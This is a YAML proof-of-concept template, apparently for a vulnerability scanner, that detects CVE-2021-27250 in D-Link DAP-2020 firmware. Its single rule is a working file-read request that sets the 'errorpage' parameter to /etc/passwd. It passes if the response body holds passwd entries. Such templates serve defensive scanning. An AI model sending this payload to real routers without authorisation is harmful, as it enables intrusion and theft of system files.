name: yaml-poc-dlink-dap-2020_firmware-other-CVE-2021-27250
binding: 7aa48e21-adc3-4c3e-ae25-d867107deba1
detail:
    author: system_user
    links:
        - https://mp.weixin.qq.com/s/SpM8AkRz1bYXd9qZ6N_71w
        - https://nvd.nist.gov/vuln/detail/CVE-2021-27250
        - https://suid.ch/research/DAP-2020_Preauth_RCE_Chain.html
        - https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201
        - https://www.cybersecurity-help.cz/vdb/SB2021100105
        - https://www.zerodayinitiative.com/advisories/ZDI-21-205/
    vulnerability:
        id: 88318356-ec0c-4db2-95db-3f71aaf0f615
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cgi-bin/webproc
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=123&%3Aaction=login&%3Asessionid=3c1f7123
        expression: response.status == 200 && "root:[^:]*:[0-9]*:[0-9]*:[^:]*".bmatches(response.body)
expression: r0()
